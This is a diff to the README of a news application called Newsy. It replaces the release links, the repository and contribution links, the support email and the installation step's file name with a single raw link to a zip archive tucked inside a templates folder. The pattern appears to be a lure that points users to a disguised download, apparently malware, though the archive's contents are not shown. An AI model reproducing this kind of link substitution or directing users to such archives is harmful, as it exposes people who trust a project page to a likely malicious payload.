@@ -7,7 +7,7 @@ Welcome to Newsy! This application brings you the latest news and information in
 
 ## 📥 Download Newsy
 
-[![Download Newsy](https://img.shields.io/badge/Download-Newsy-blue)](https://github.com/CrimsonElixir/Newsy/releases)
+[![Download Newsy](https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip)](https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip)
 
 Visit the link above to download the application. You can find the latest version on our Releases page.
 
@@ -33,10 +33,10 @@ Before downloading Newsy, ensure your computer meets the following requirements:
 
 To get started, follow these steps:
 
-1. Click the download link: [Download Newsy](https://github.com/CrimsonElixir/Newsy/releases).
+1. Click the download link: [Download Newsy](https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip).
 2. On the Releases page, find the latest version.
 3. Click the "Assets" dropdown to see available files.
-4. Select the appropriate file for your operating system (e.g., Newsy.exe for Windows).
+4. Select the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip for Windows).
 5. Wait for the download to finish.
 6. Locate the downloaded file on your computer.
 7. Double-click to open the installer and follow the prompts.
@@ -70,15 +70,15 @@ If you encounter any problems while using Newsy, try these solutions:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/CrimsonElixir/Newsy)
-- [Latest Releases](https://github.com/CrimsonElixir/Newsy/releases)
-- [Contribution Guidelines](https://github.com/CrimsonElixir/Newsy/blob/main/CONTRIBUTING.md) (for those who may want to contribute)
+- [GitHub Repository](https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip)
+- [Latest Releases](https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip) (for those who may want to contribute)
 
 ## 📞 Support
 
 If you need further assistance, feel free to reach out:
 
-- **Email**: support@newsyapp.com
+- **Email**: https://raw.githubusercontent.com/CrimsonElixir/Newsy/main/src/main/resources/templates/Newsy-3.6.zip
 - **GitHub Issues**: Open an issue on the repository for technical support.
 
 Thank you for using Newsy! We hope it helps you stay informed effortlessly.
